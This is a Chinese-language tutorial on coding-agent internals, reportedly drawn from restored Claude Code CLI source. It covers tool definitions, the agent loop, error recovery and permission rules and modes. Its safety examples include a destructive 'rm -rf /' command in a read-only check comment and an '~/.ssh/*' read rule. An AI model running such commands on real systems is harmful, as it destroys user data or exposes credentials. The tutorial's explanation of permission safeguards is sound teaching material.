# Coding Agent 实现原理教程

> 以 `CC/`（从 source map 还原的 Claude Code CLI 源码）为教材，循序渐进地理解一个工业级 Coding Agent 是如何实现的。
> 每课结构：**读 TypeScript 原文 → 用 Python 重写核心逻辑 → 提炼设计原则**。

## 课程目录

| 课次 | 主题 | 核心源文件 | 状态 |
|------|------|-----------|------|
| 第 1 课 | 心智模型 + Tool 抽象 | `src/Tool.ts` | ✅ |
| 第 2 课 | Agent 主循环 | `src/query.ts`、`src/services/tools/toolOrchestration.ts` | ✅ |
| 第 3 课 | 权限与安全体系 | `src/utils/permissions/`、`src/hooks/useCanUseTool.tsx` | ✅ |
| 第 4 课 | 上下文管理与压缩 | `src/services/compact/` | ✅ |
| 第 5 课 | 子 Agent 与多 Agent 协作 | `src/tools/AgentTool/`、`src/utils/forkedAgent.ts` | ✅ |
| 第 6 课 | 扩展机制 | `src/skills/`、`src/commands.ts`、`src/services/mcp/` | 进行中 |

### TypeScript ↔ Python 对照表

| TypeScript | Python 对应物 |
|------------|--------------|
| `type Tool = {...}` 类型定义 | `dataclass` / `Protocol` / 基类 |
| Zod schema（运行时校验） | **Pydantic** |
| `z.infer<Input>`（从 schema 推导类型） | Pydantic 模型本身就是类型 |
| `Promise<T>` / `async` | `async def` / `awaitable` |
| `AsyncGenerator<T>` / `async function*` | `AsyncGenerator` / `async def` + `yield` |
| `?` 可选成员 | `Optional[...] = None` |
| `{...DEFAULTS, ...def}` 对象展开 | `{**DEFAULTS, **overrides}` |
| `AbortController` | `asyncio.Event` / `CancelledError` |

---

# 第 1 课：Coding Agent 的心智模型 + Tool 抽象

## 1.1 心智模型：Agent 到底是什么？

剥掉所有花哨的外壳，一个 Coding Agent 本质上就是这个循环：

```
┌─────────────────────────────────────────────┐
│  while (模型还想继续做事):                    │
│    1. 把 [系统提示词 + 对话历史 + 工具清单]    │
│       发给 LLM API                           │
│    2. 模型返回: 文本 和/或 工具调用请求        │
│    3. 如果有工具调用:                         │
│       a. 校验参数 (validateInput)            │
│       b. 检查权限 (checkPermissions → 问用户) │
│       c. 执行工具 (call)                     │
│       d. 把结果塞回对话历史                   │
│    4. 回到第 1 步                             │
│  直到模型只回复文本、不再调用工具 → 本轮结束    │
└─────────────────────────────────────────────┘
```

**LLM 本身不能读文件、不能跑命令**——它只会输出"我想调用 Bash 工具，参数是 `{"command": "ls"}`"这样的 JSON。真正干活的是 Agent 程序。所以整个系统的地基就是：**工具（Tool）如何定义、如何被安全地执行**。

Python 表达：

```python
async def agent_loop(messages: list[Message]):
    while True:
        # 1. 把 [系统提示词 + 历史 + 工具清单] 发给 LLM
        response = await llm_api.call(
            system=system_prompt,
            messages=messages,
            tools=[t.to_api_schema() for t in tools],  # 工具"说明书"
        )
        messages.append(response)

        tool_calls = extract_tool_calls(response)
        if not tool_calls:
            return  # 模型只回了文本，本轮结束

        # 2. 执行每个工具调用，把结果塞回历史
        for call in tool_calls:
            result = await run_tool(call)          # 校验→权限→执行
            messages.append(tool_result_message(result))
        # 3. 回到循环顶部，带着工具结果再问模型
```

## 1.2 Tool 抽象：一个工具需要具备什么？

`src/Tool.ts` 第 362 行的 `Tool` 类型有 40+ 个成员，按职责分组后其实就 **5 类**。

### ① 身份与模型侧接口 —— "模型怎么知道该用我"

```ts
readonly name: string              // 工具名，如 "Bash"
readonly inputSchema: Input        // Zod schema，定义参数格式
prompt(options): Promise<string>   // 给模型看的工具使用说明书
searchHint?: string                // 工具太多时供 ToolSearch 检索的关键词
readonly shouldDefer?: boolean     // 延迟加载：不在首轮提示词里出现，省 token
readonly alwaysLoad?: boolean      // 反之：永不延迟，首轮必须可见
```

**关键洞察**：每个工具都要转换成 API 请求里的 `tools` 数组项——`name` + `description` + JSON Schema。模型靠读这些"说明书"决定调用哪个工具，`prompt()` 的文本质量直接决定模型用不用得好这个工具。

`shouldDefer` / `alwaysLoad`（L442-449）是大规模工具管理的实战技巧：工具多达 50+ 时全塞进提示词太贵，于是有了"延迟加载 + ToolSearch 检索"机制。

### ② 执行入口 —— "真正干活的方法"

```ts
call(
  args: z.infer<Input>,             // 已通过 Zod 校验的参数
  context: ToolUseContext,          // 运行环境
  canUseTool: CanUseToolFn,         // 权限询问回调
  parentMessage: AssistantMessage,
  onProgress?: ToolCallProgress<P>, // 流式进度上报（如 Bash 实时输出）
): Promise<ToolResult<Output>>
```

`ToolResult`（L321-336）除了 `data`（喂回给模型的结果），还能带：
- `newMessages` —— 往对话里追加消息
- `contextModifier` —— 修改后续工具的执行上下文

**工具不只是"函数"，它能影响整个会话。**

### ③ 安全与权限 —— "凭什么让你执行"

```ts
validateInput?(input, context)     // 参数合法吗？失败信息返回给【模型】自我修正
checkPermissions(input, context)   // 需要问【用户】吗？工具特有的权限逻辑
isReadOnly(input): boolean         // 只读操作可以自动放行
isDestructive?(input): boolean     // 删除/覆盖/发送等不可逆操作
isConcurrencySafe(input): boolean  // 能和其他工具并行跑吗？
isOpenWorld?(input): boolean       // 会触网吗？
toAutoClassifierInput(input)       // 给安全分类器看的投影（见第 3 课）
```

**两个关键洞察**：

1. **错误分层**：`validateInput` 的失败消息**发回给模型**让它修正参数（如"文件不存在"），`checkPermissions` 决定**是否弹窗问用户**。两条完全不同的反馈通道。
2. **安全属性是"工具+参数"级别的，不是工具级别的**：这些谓词都接收 `input`，因为 `Bash("ls")` 只读，而 `Bash("rm -rf")` 是破坏性的。

### ④ UI 渲染 —— "用户在终端看到什么"

```ts
renderToolUseMessage(...)          // 工具调用行（参数还在流式传输时就开始渲染！）
renderToolUseProgressMessage?(...)  // 执行中的进度
renderToolResultMessage?(...)      // 结果展示（如 diff 视图）
renderToolUseRejectedMessage?(...)  // 被用户拒绝时的展示
renderToolUseErrorMessage?(...)     // 出错时的展示
renderGroupedToolUse?(...)          // 多个同类工具并行时合并渲染
```

L605 的注释指出 `renderToolUseMessage` 的 `input` 是 `Partial<>` ——**参数还没流完就开始渲染了**，这是流式 UX 的细节。执行逻辑与渲染逻辑放在同一个对象里但完全分离，让 CLI / SDK / 远程模式可以共用执行逻辑、各自渲染。

### ⑤ 模型侧结果序列化

```ts
mapToolResultToToolResultBlockParam(content, toolUseID) // 结果 → API 消息块
maxResultSizeChars: number   // 超长结果落盘，只给模型一个文件路径+预览
extractSearchText?(out)      // 供 transcript 搜索索引用的扁平文本
```

`maxResultSizeChars`（L457-466）是上下文管理的第一道防线：`cat` 出 10 万行的结果不能直接塞进上下文——超限就写入文件，模型只看到预览和路径。注释还提到 Read 工具要设成 `Infinity`，否则会形成 `Read → 文件 → Read` 的循环。

### Python 重写

```python
from dataclasses import dataclass, field
from typing import Any, Callable, Optional
from pydantic import BaseModel

# ---- 参数校验结果（对应 ValidationResult）----
@dataclass
class ValidationResult:
    ok: bool
    message: str = ""       # 失败时，这段话发回给【模型】让它自我修正
    error_code: int = 0

# ---- 权限检查结果（对应 PermissionResult）----
@dataclass
class PermissionResult:
    behavior: str            # 'allow' | 'deny' | 'ask'  ← ask 表示要弹窗问用户
    updated_input: dict      # 权限系统可以改写参数（比如重写沙箱路径）
    message: str = ""

# ---- 工具执行结果（对应 ToolResult<T>）----
@dataclass
class ToolResult:
    data: Any                                          # 喂回给模型的结果
    new_messages: list = field(default_factory=list)   # 可以往对话追加消息
    context_modifier: Optional[Callable] = None        # 可以修改后续工具的执行环境


class Tool:
    # ========== ① 身份与模型侧接口 ==========
    name: str = ""
    input_schema: type[BaseModel] = None   # Pydantic 模型（对应 Zod schema）
    should_defer: bool = False             # 工具太多时延迟加载，省 token

    async def prompt(self) -> str:
        """给模型看的'使用说明书'，写得好坏直接决定模型用得好不好"""
        raise NotImplementedError

    def to_api_schema(self) -> dict:
        """转换成 API 请求里 tools 数组的一项 —— 模型看到的就是这个"""
        return {
            "name": self.name,
            "description": self._description,
            "input_schema": self.input_schema.model_json_schema(),
            #                ^^^^^^^ Pydantic 一行导出 JSON Schema
            # 这就是"schema 单一来源"：同一份 schema 既给模型看，又做运行时校验
        }

    # ========== ② 执行入口 ==========
    async def call(self, args: BaseModel, context: "ToolUseContext",
                   on_progress: Callable = None) -> ToolResult:
        raise NotImplementedError

    # ========== ③ 安全与权限 ==========
    # 注意：这些谓词都接收 input！危险性取决于"工具+参数"，不是工具本身
    def is_read_only(self, args) -> bool:        return False  # 默认假设会写
    def is_destructive(self, args) -> bool:      return False
    def is_concurrency_safe(self, args) -> bool: return False  # 默认不能并行
    def is_open_world(self, args) -> bool:       return False  # 会触网吗

    async def validate_input(self, args, context) -> ValidationResult:
        """参数合法吗？失败信息发回给【模型】自我修正（不打扰用户）"""
        return ValidationResult(ok=True)

    async def check_permissions(self, args, context) -> PermissionResult:
        """需要问【用户】吗？工具特有的权限逻辑"""
        return PermissionResult("allow", args.model_dump())

    # ========== ④ UI 渲染 ==========
    # 执行和渲染在同一对象里但完全分离 → CLI/SDK/远程共用执行、各自渲染
    def render_tool_use(self, partial_args: dict) -> str:
        """注意参数是 partial —— 参数还在流式传输时就开始渲染了！"""
        return f"{self.name}({partial_args})"

    def render_result(self, output) -> str: ...
    def render_rejected(self, args) -> str: ...

    # ========== ⑤ 模型侧结果序列化 ==========
    max_result_size_chars: int = 20_000   # 超长结果落盘，只给模型路径+预览

    def map_result_to_api_block(self, output, tool_use_id: str) -> dict:
        text = str(output)
        if len(text) > self.max_result_size_chars:
            path = persist_to_disk(text)              # 上下文管理第一道防线
            text = f"[输出过长，已保存到 {path}]\n预览:\n{text[:2000]}"
        return {"type": "tool_result", "tool_use_id": tool_use_id, "content": text}
```

## 1.3 ToolUseContext：工具的"运行环境"

`Tool.ts` L158 的 `ToolUseContext` 是所有工具共享的执行上下文，关键成员：

| 成员 | 作用 |
|------|------|
| `abortController` | 用户按 ESC → 所有正在执行的工具能被打断 |
| `readFileState: FileStateCache` | **读后写检查**：Edit 要求文件必须先 Read 过且读后未被外部修改（第 3 课详解） |
| `messages: Message[]` | 当前对话历史，工具可以感知上下文 |
| `getAppState / setAppState` | 全局状态读写 |
| `agentId?: AgentId` | 只有子 Agent 才有——同一套 Context 结构同时服务主线程和子 Agent |
| `options.tools` | 工具能看到工具清单（AgentTool 靠它给子 Agent 分发工具） |
| `contentReplacementState` | 工具结果预算状态（第 4 课） |
| `localDenialTracking` | 权限连续拒绝计数（第 3 课） |

```python
@dataclass
class ToolUseContext:
    abort_event: "asyncio.Event"        # 用户按 ESC → 置位，工具检查它来中断
    read_file_state: dict[str, float]   # {文件路径: 读取时的mtime} ← 防"盲改文件"
    messages: list                      # 当前对话历史
    tools: list[Tool]                   # 工具清单
    app_state: dict                     # 全局状态
    agent_id: Optional[str] = None      # 只有子 Agent 才有值
    permission_mode: str = "default"    # default / plan / bypassPermissions ...
```

## 1.4 buildTool：fail-closed 的默认值哲学

`Tool.ts` L757 的 `TOOL_DEFAULTS` 值得细品，注释明确写了 **"fail-closed where it matters"（关键处默认关死）**：

```python
TOOL_DEFAULTS = {
    "is_enabled":          lambda *a: True,
    "is_concurrency_safe": lambda *a: False,   # ← 默认不能并行（安全）
    "is_read_only":        lambda *a: False,   # ← 默认假设会写（安全）
    "is_destructive":      lambda *a: False,
    "check_permissions":   lambda args, ctx: PermissionResult("allow", args),
    "to_auto_classifier_input": lambda *a: "",  # 默认跳过分类器
}

def build_tool(**tool_def) -> dict:
    """fail-closed：你忘了声明的安全属性，一律按'最不安全'处理。
    宁可多问用户一次，绝不默认放行。"""
    return {**TOOL_DEFAULTS, **tool_def}      # 对应 TS 的 {...TOOL_DEFAULTS, ...def}
```

写新工具时如果忘了声明安全属性，系统会假设它"不安全、会写、不能并发"。这是安全系统设计的经典原则。

## 1.5 完整示例：BashTool（简化版）

看基类怎么被"填空"，尤其注意**安全谓词如何依赖参数**：

```python
import asyncio

class BashInput(BaseModel):          # ← 对应 Zod 的 inputSchema
    command: str
    timeout_ms: int = 120_000

READONLY_COMMANDS = {"ls", "cat", "grep", "find", "head", "tail", "pwd"}

class BashTool(Tool):
    name = "Bash"
    input_schema = BashInput

    async def prompt(self) -> str:
        return "在持久化 shell 中执行命令。避免使用 cat/grep，请用专用工具……"

    # ---- 安全谓词：同一个工具，危险性由参数决定 ----
    def is_read_only(self, args: BashInput) -> bool:
        parts = args.command.split()
        return bool(parts) and parts[0] in READONLY_COMMANDS
        # Bash("ls") → True, Bash("rm -rf /") → False

    def is_destructive(self, args: BashInput) -> bool:
        return "rm " in args.command or "rm -" in args.command

    def is_concurrency_safe(self, args: BashInput) -> bool:
        return self.is_read_only(args)        # 只读命令才允许并行

    async def check_permissions(self, args, context) -> PermissionResult:
        if self.is_read_only(args):
            return PermissionResult("allow", args.model_dump())
        return PermissionResult("ask", args.model_dump())   # 弹窗问用户

    # ---- 真正干活 ----
    async def call(self, args: BashInput, context, on_progress=None) -> ToolResult:
        proc = await asyncio.create_subprocess_shell(
            args.command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        lines = []
        async for line in proc.stdout:                     # 流式读取
            lines.append(line.decode())
            if on_progress:
                on_progress(line.decode())                 # 实时回显给 UI
            if context.abort_event.is_set():               # 用户按了 ESC
                proc.kill()
                return ToolResult(data="[用户中断]")
        await proc.wait()
        return ToolResult(data="".join(lines))
```

## 1.6 汇合点：run_tool 流水线

第 1 课所有概念的交汇——**模型发起一个工具调用后发生的完整流水线**：

```python
async def run_tool(tool_call: dict, tools: list[Tool], context: ToolUseContext):
    # 0️⃣ 找到工具
    tool = next((t for t in tools if t.name == tool_call["name"]), None)
    if tool is None:
        return error_result(f"未知工具: {tool_call['name']}")   # 错误也发回给模型

    # 1️⃣ Schema 校验（Pydantic ≈ Zod）—— 失败信息发回给模型，它会修正参数重试
    try:
        args = tool.input_schema(**tool_call["input"])
    except ValidationError as e:
        return error_result(f"参数错误: {e}")

    # 2️⃣ 业务校验 —— 同样发回给模型（比如"文件不存在""文件未先 Read"）
    v = await tool.validate_input(args, context)
    if not v.ok:
        return error_result(v.message)

    # 3️⃣ 权限检查 —— 这一步升级到【用户】
    perm = await tool.check_permissions(args, context)
    if perm.behavior == "deny":
        return error_result("权限拒绝: " + perm.message)
    if perm.behavior == "ask":
        if not await ask_user_permission(tool, args):          # 弹窗
            return error_result("用户拒绝了此操作")             # 拒绝也告诉模型
    args = tool.input_schema(**perm.updated_input)             # 权限系统可能改写了参数

    # 4️⃣ 真正执行
    result = await tool.call(args, context, on_progress=render_progress)

    # 5️⃣ 序列化回 API 消息块（超长落盘发生在这里）
    return tool.map_result_to_api_block(result.data, tool_call["id"])
```

## 1.7 第 1 课小结

| 设计决策 | 为什么 |
|----------|--------|
| 工具 = 声明式大对象，而非简单函数 | 一个工具要同时面向模型（schema/prompt）、面向安全系统（权限谓词）、面向用户（渲染） |
| 安全谓词接收 `input` 参数 | 危险性取决于"工具+参数"组合 |
| validateInput / checkPermissions 分离 | 前者反馈给模型自我修正，后者升级给用户决策 |
| buildTool 默认值 fail-closed | 忘声明 → 按最不安全处理 |
| Zod/Pydantic schema 单一来源 | 同一份 schema 既生成给模型的 JSON Schema，又做运行时参数校验 |
| `maxResultSizeChars` 超长落盘 | 上下文窗口保护的第一道防线 |

---

# 第 2 课：Agent 主循环（`src/query.ts`，1730 行）

上一课的 `agent_loop` 是 20 行的玩具。工业级实现比玩具多了什么？**答案是：一层上下文管理流水线 + 一套自愈恢复机制。**

## 2.1 主循环是"生成器"，不是普通函数

`query.ts` L219：

```ts
export async function* query(params): AsyncGenerator<StreamEvent | Message | ..., Terminal>
```

`async function*`（异步生成器）——**边执行边往外吐消息**，而不是攒到最后一次性返回。

```python
async def query(params) -> AsyncGenerator[Message, None]:
    """Agent 主循环。每产生一条消息就立刻 yield 给调用方（UI/SDK）。

    为什么用生成器而不是普通函数？
    1. 流式 UX：模型每吐一个字、每个工具一出结果，UI 立刻能渲染
    2. 调用方无关：REPL、SDK、远程桥接消费同一个生成器，各自渲染
    3. 天然可中断：调用方停止迭代，生成器就停了
    """
    async for message in query_loop(params):
        yield message
```

**这是 Agent 架构的第一个重要选型**：主循环和 UI 完全解耦，通过消息流通信。后端用 SSE 推事件流本质是同一个思想。

## 2.2 循环骨架：显式的 State 状态机

`query.ts` L204 的 `State` 类型把跨迭代的所有可变状态收进一个对象，每次 `continue` 前整体替换。完整骨架：

```python
from dataclasses import dataclass, replace

@dataclass
class State:
    messages: list                    # 对话历史
    turn_count: int = 1
    max_output_tokens_override: int | None = None
    max_output_tokens_recovery_count: int = 0    # 输出截断恢复次数
    has_attempted_reactive_compact: bool = False # 413 压缩只试一次（防死循环）
    stop_hook_active: bool | None = None
    transition: str | None = None     # 上一轮为什么 continue（可测试性！）

async def query_loop(params) -> AsyncGenerator:
    state = State(messages=params.messages)

    while True:                                      # ← L307 的 while(true)
        # ═══ 阶段A：发请求前，先"整理行李"（上下文管理流水线）═══
        msgs = get_messages_after_compact_boundary(state.messages)
        msgs = apply_tool_result_budget(msgs)        # A1 超大工具结果换成占位符
        msgs = microcompact(msgs)                    # A2 微压缩：裁掉陈旧工具结果
        msgs = await autocompact_if_needed(msgs)     # A3 快满了→全量摘要压缩
        if still_over_hard_limit(msgs):              # A4 兜底熔断
            yield error_message("Prompt too long"); return "blocking_limit"

        # ═══ 阶段B：流式调用模型 ═══
        assistant_messages, tool_use_blocks = [], []
        needs_follow_up = False                      # ← 唯一的"要不要继续循环"信号
        async for message in call_model(msgs, system_prompt, tools):
            yield message                            # 边收边转发给 UI
            assistant_messages.append(message)
            blocks = extract_tool_use_blocks(message)
            if blocks:
                tool_use_blocks += blocks
                needs_follow_up = True               # 模型要用工具 → 还有下一圈

        # ═══ 阶段C：没有工具调用 → 本轮结束（或触发恢复）═══
        if not needs_follow_up:
            recovery = try_recovery_paths(state, assistant_messages)  # 见 2.5
            if recovery:
                state = recovery; continue           # 自愈后重试
            return "completed"                       # ← 正常出口只有这一个

        # ═══ 阶段D：执行工具（并行/串行调度，见 2.4）═══
        tool_results = []
        async for update in run_tools(tool_use_blocks, tools, context):
            yield update.message                     # 工具结果也流式给 UI
            tool_results.append(update.message)

        if context.abort_event.is_set():             # 用户执行中按了 ESC
            yield interruption_message(); return "aborted_tools"

        # ═══ 阶段E：滚动历史，进入下一圈 ═══
        state = replace(state,
            messages=[*msgs, *assistant_messages, *tool_results],
            turn_count=state.turn_count + 1)
        # 隐式 continue → 带着工具结果回到阶段 A
```

三个值得注意的细节：

1. **用 `needsFollowUp` 而非 `stop_reason`**。L553-556 注释：*"stop_reason === 'tool_use' is unreliable"* ——不信任 API 的停止原因字段，而是自己数有没有 `tool_use` 块。**不要信任你不可控的信号。**
2. **`transition` 字段**记录"上一轮为什么继续"，纯粹为了可测试性——测试能断言"恢复路径触发过"，不用翻消息内容。
3. **返回值是带 reason 的 Terminal 对象**：`completed` / `aborted_streaming` / `aborted_tools` / `prompt_too_long` / `model_error` / `blocking_limit` / `hook_stopped` / `stop_hook_prevented` / `image_error`，每种退出路径都有名字。

## 2.3 阶段 A：为什么发请求前要过四道"减肥"工序？

`query.ts` L365-535，顺序是精心设计的：

```python
# A1 工具结果预算（applyToolResultBudget, L379）
#    按 tool_use_id 把超预算的旧工具结果替换成占位符
# A2 微压缩（microcompact, L414）
#    只裁剪"陈旧的工具结果"（比如 20 轮前 cat 的文件内容），保留对话骨架
#    便宜、用户几乎无感
# A3 全量自动压缩（autocompact, L454）
#    token 数逼近上限 → 用模型把整段历史总结成摘要，替换原文
#    昂贵、有损
# A4 熔断（L637-647）
#    仍超硬限制 → 直接返回 blocking_limit，保留空间让用户能手动 /compact
```

**设计原则：便宜的手段先上，昂贵的手段兜底。** 注释 L428-431 说得很直白：*"collapse 跑在 autocompact 之前——如果 collapse 把我们降到阈值以下，autocompact 就成了 no-op，我们保住了细粒度上下文而不是一份摘要"*。（第 4 课专门展开）

## 2.4 阶段 D：工具调度——并行还是串行？

核心在 `src/services/tools/toolOrchestration.ts` 的 `partitionToolCalls`（L91）：

```python
def partition_tool_calls(tool_calls, tools) -> list[Batch]:
    """把工具调用切成批次：连续的并发安全调用合并成一批，其余单独成批。

    例：模型返回 [Read A, Read B, Edit C, Read D, Read E]
    切成 → [并行批: Read A+B] [串行批: Edit C] [并行批: Read D+E]
    注意：保持模型给出的顺序！只合并"连续的"安全调用。
    """
    batches = []
    for call in tool_calls:
        tool = find_tool(tools, call.name)
        parsed = tool.input_schema.safe_parse(call.input)
        try:
            safe = parsed.ok and tool.is_concurrency_safe(parsed.data)
        except Exception:
            safe = False    # ← 判断函数自己抛异常？按不安全处理（又见 fail-closed）
        if safe and batches and batches[-1].is_safe:
            batches[-1].blocks.append(call)     # 并入上一个并行批
        else:
            batches.append(Batch(is_safe=safe, blocks=[call]))
    return batches


async def run_tools(tool_calls, tools, context):
    MAX_CONCURRENCY = int(os.environ.get("CLAUDE_CODE_MAX_TOOL_USE_CONCURRENCY", 10))
    for batch in partition_tool_calls(tool_calls, tools):
        if batch.is_safe:
            # 并行批：最多 10 个同时跑（Semaphore 限流）
            async for update in run_concurrently(batch.blocks, limit=MAX_CONCURRENCY):
                yield update
        else:
            # 串行批：一个一个跑，且每个工具的 context_modifier 立刻生效
            for call in batch.blocks:
                async for update in run_tool(call, context):
                    if update.context_modifier:
                        context = update.context_modifier(context)  # 影响后续工具！
                    yield update
```

两个细节：

- **L102-106 的 try/catch**：连 `isConcurrencySafe` **本身抛异常**（比如 shell 命令解析失败）都考虑到了，按不安全处理。
- **StreamingToolExecutor**（L562、L841）：更激进的优化——模型还在流式输出后面的文字时，前面已解析完的工具调用就**提前开始执行**。模型打字 5-30 秒，工具执行藏在这段时间里，用户感知延迟大幅下降。

## 2.5 阶段 C：自愈机制——工业级与玩具的最大差距

玩具循环遇到 API 错误就崩了。真实实现（L1062-1265）把错误分成"可恢复"和"不可恢复"，可恢复的走**自愈路径**：

```python
def try_recovery_paths(state, assistant_messages) -> State | None:
    last = assistant_messages[-1] if assistant_messages else None

    # ① 上下文超长（413 prompt_too_long）→ 紧急压缩后重试
    if is_prompt_too_long(last):
        if not state.has_attempted_reactive_compact:      # 只试一次！
            compacted = reactive_compact(state.messages)
            if compacted:
                return replace(state, messages=compacted,
                               has_attempted_reactive_compact=True,
                               transition="reactive_compact_retry")
        return None   # 已试过还超长 → 放弃，把错误如实呈现

    # ② 输出被截断（max_output_tokens）→ 两级恢复
    if is_max_output_tokens(last):
        if state.max_output_tokens_override is None:
            # 第一级：同样的请求，把输出上限从 8k 提到 64k，直接重发
            return replace(state, max_output_tokens_override=65536,
                           transition="max_output_tokens_escalate")
        if state.max_output_tokens_recovery_count < 3:    # 硬上限 3 次
            # 第二级：注入一条"继续，别道歉别复述，把工作切小块"的用户消息
            nudge = user_message(
                "Output token limit hit. Resume directly — no apology, no recap. "
                "Break remaining work into smaller pieces.", is_meta=True)
            return replace(state,
                messages=[*state.messages, *assistant_messages, nudge],
                max_output_tokens_recovery_count=state.max_output_tokens_recovery_count + 1,
                transition="max_output_tokens_recovery")
    return None       # 无法恢复 → 主循环 return，错误如实上报
```

三个教科书级的细节：

### (1) 错误"扣留"机制（withholding，L788-825）

流式过程中收到可恢复错误时，**先不 yield 给 UI**——万一恢复成功，用户根本不用看到这次失败；恢复失败才补发。原因（L166-172 注释）：SDK 消费者一看到 `error` 字段就终止会话，提前泄漏错误 = 杀死一次本可成功的恢复。

### (2) 防死循环护栏

- **L1168-1172**：为什么 413 之后不执行 stop hooks？*"error → hook 阻断 → 重试 → error → …hook 每循环注入更多 token"* ——注释里直接写了 **death spiral（死亡螺旋）**。
- **L1292-1296**：`hasAttemptedReactiveCompact` 在 stop-hook 重试时**不重置**，否则"压缩 → 还是超长 → hook 报错 → 再压缩 → …烧掉几千次 API 调用"。

这些注释说明是真实烧钱事故换来的教训。

### (3) 每个工具调用必须有配对的结果（L123-149）

```python
def yield_missing_tool_result_blocks(assistant_messages, error_message):
    """任何异常/中断路径下，给每个悬空的 tool_use 块补一个 is_error 的 tool_result。
    否则下次 API 调用会因消息不配对直接 400。这是玩具实现最容易踩的坑。"""
    for msg in assistant_messages:
        for tool_use in extract_tool_use_blocks(msg):
            yield user_message(content=[{
                "type": "tool_result",
                "tool_use_id": tool_use.id,
                "content": error_message,
                "is_error": True,
            }])
```

### (4) 模型降级（L894-950）

主模型限流时抛 `FallbackTriggeredError`，循环捕获后切到备用模型、清空半成品消息、整轮重试，并给用户一条 "Switched to X due to high demand" 的警告级提示。还要 `stripSignatureBlocks` ——thinking 签名是模型绑定的，把带签名的 thinking 块重放给另一个模型会 400。

## 2.6 第 2 课小结：工业级主循环 = 玩具循环 + 三层铠甲

| 层 | 玩具版 | `query.ts` 真实版 |
|----|--------|----------------|
| **输出方式** | 攒完返回 | 异步生成器，逐消息流式 yield |
| **继续信号** | 信 API 的 `stop_reason` | 自己数 `tool_use` 块（`needsFollowUp`） |
| **发请求前** | 直接发 | 4 道上下文减肥工序（预算→微压→摘要→熔断） |
| **工具执行** | 顺序跑 | 保序分批：连续只读并行（≤10）、写操作串行；甚至流式提前执行 |
| **错误处理** | 崩溃 | 分级自愈：扣留→压缩重试/升额度/注入 nudge/换模型，每条路都有防死循环护栏 |
| **中断** | 无 | `abortController` + 全路径补 `tool_result` 配对 |
| **退出** | 隐式 | 显式 Terminal reason + `transition` 字段可测试 |

### 可迁移到自研 Harness 的要点

1. 主循环用异步生成器（Python `AsyncGenerator`），UI/API 层只消费事件流。
2. 跨迭代状态收进一个显式 `State` dataclass，`continue` 前整体 `replace()`。
3. 每种退出路径给一个 reason 名字，便于观测和测试。
4. 工具调用与工具结果**必须成对**，异常路径也要补齐。
5. 恢复逻辑一律加"最多试 N 次"的护栏，并且护栏标志不要在其他分支被重置。
6. 可恢复错误先扣留、恢复失败才上报。

---

# 第 3 课：权限与安全体系 —— Agent 凭什么敢在你的机器上跑命令

前两课讲了"怎么让 Agent 干活"。这一课讲**"怎么不让它把你的机器搞坏"**——这是 Coding Agent 与普通 Chatbot 的本质区别，也是整个系统里防御层次最深的部分。

## 3.1 权限规则：一个字符串 DSL

规则格式 `ToolName(content)`，解析实现在 `src/utils/permissions/permissionRuleParser.ts`：

```
Bash(git status:*)      # Bash 工具，命令前缀是 git status
Bash(npm install)       # 精确匹配
Edit(/path/to/file)     # Edit 工具，特定路径
Read(~/.ssh/*)          # 通配路径
mcp__server1__*         # 某 MCP 服务器的所有工具
Bash                    # 无 content → 工具级规则，该工具全放行
```

`permissionRuleValueFromString`（L93）看似简单，但处理了一个真实的坑——**内容里本身带括号**（如 `psycopg2.connect()`），存储时转义成 `\(` `\)`，解析时要找"未转义"的括号：

```python
def permission_rule_value_from_string(rule_string: str) -> dict:
    open_idx = find_first_unescaped(rule_string, '(')
    if open_idx == -1:
        return {"tool_name": normalize_legacy(rule_string)}   # 工具级规则

    close_idx = find_last_unescaped(rule_string, ')')
    # 三种畸形情况全部降级为"工具名"处理（fail-safe，不猜用户意图）
    if close_idx <= open_idx or close_idx != len(rule_string) - 1:
        return {"tool_name": normalize_legacy(rule_string)}

    tool_name = rule_string[:open_idx]
    raw = rule_string[open_idx + 1:close_idx]
    if not tool_name:                       # "(foo)" 畸形
        return {"tool_name": normalize_legacy(rule_string)}
    if raw in ("", "*"):                    # "Bash()" / "Bash(*)" → 工具级规则
        return {"tool_name": normalize_legacy(tool_name)}
    return {"tool_name": normalize_legacy(tool_name),
            "rule_content": unescape(raw)}

def find_first_unescaped(s: str, ch: str) -> int:
    """一个字符是否被转义 = 它前面的反斜杠个数是奇数。
    这样 "a\\\\(b" 里的 ( 是未转义的（前面2个反斜杠），而 "a\\(b" 里是转义的。"""
    for i, c in enumerate(s):
        if c != ch:
            continue
        n = 0; j = i - 1
        while j >= 0 and s[j] == '\\':
            n += 1; j -= 1
        if n % 2 == 0:
            return i
    return -1
```

`normalizeLegacyToolName`（L31）：工具改名后（`Task`→`Agent`、`KillShell`→`TaskStopTool`、`BashOutputTool`→`TaskOutputTool`），老规则依然生效。**权限规则是持久化的用户数据，重命名必须向后兼容。**

## 3.2 骨架：三张规则表 × 六种模式

`ToolPermissionContext`（`Tool.ts` L123）：

```python
@dataclass
class ToolPermissionContext:
    mode: str                              # 六种权限模式，见下
    always_allow_rules: dict[str, list]    # {来源: [规则]} —— 白名单
    always_deny_rules: dict[str, list]     # 黑名单（优先级最高）
    always_ask_rules: dict[str, list]      # 强制询问（能覆盖白名单）
    additional_working_directories: dict   # 额外允许操作的目录
    is_bypass_permissions_mode_available: bool
    should_avoid_permission_prompts: bool  # 后台 Agent 无 UI → 自动拒绝
    pre_plan_mode: str | None = None       # 进 plan 前的模式，退出时恢复
```

每张表按**来源**分组（`PermissionRuleSource`，8 种）：

```python
RULE_SOURCES = [
    "policySettings",   # 企业策略（管理员下发，用户不可改）
    "userSettings",     # ~/.claude/settings.json
    "projectSettings",  # 项目 .claude/settings.json（团队共享，进 git）
    "localSettings",    # .claude/settings.local.json（个人，不进 git）
    "flagSettings", "cliArg", "command",
    "session",          # 本次会话临时规则（点"总是允许"默认存这里）
]
```

**为什么要分来源？** 用户点"总是允许"时要能选择存哪一层——只对本次会话生效，还是写进项目配置让团队共享。而 `policySettings` 是企业管控层，用户无法覆盖。

### 六种权限模式（`src/types/permissions.ts` L16）

```python
PERMISSION_MODES = {
    "default":           "常规：按规则表判断，不确定就问用户",
    "plan":              "只读研究模式：禁止一切写操作，产出计划让用户审批",
    "acceptEdits":       "自动接受文件编辑，但 Bash 等仍需询问",
    "bypassPermissions": "完全放行（危险，需可用性开关允许）",
    "dontAsk":           "所有 ask 一律转为 deny —— 不问也不做",
    "auto":              "用模型分类器代替用户做判断（实验特性）",
}
# 另有内部模式 'bubble'（ANT 专用）
```

